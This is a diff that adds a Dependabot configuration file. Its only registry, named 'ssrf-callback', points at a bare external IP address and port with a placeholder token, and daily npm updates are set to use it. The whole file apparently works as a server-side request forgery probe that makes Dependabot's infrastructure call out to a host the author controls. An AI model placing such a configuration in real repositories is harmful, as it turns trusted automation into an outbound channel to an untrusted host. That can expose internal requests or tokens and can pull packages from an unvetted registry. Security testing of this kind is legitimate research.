@@ -1,0 +1,13 @@
+version: 2
+registries:
+  ssrf-callback:
+    type: npm-registry
+    url: http://44.211.128.59:8765/dependabot-registry/
+    token: test-token
+updates:
+  - package-ecosystem: "npm"
+    directory: "/"
+    schedule:
+      interval: "daily"
+    registries:
+      - ssrf-callback
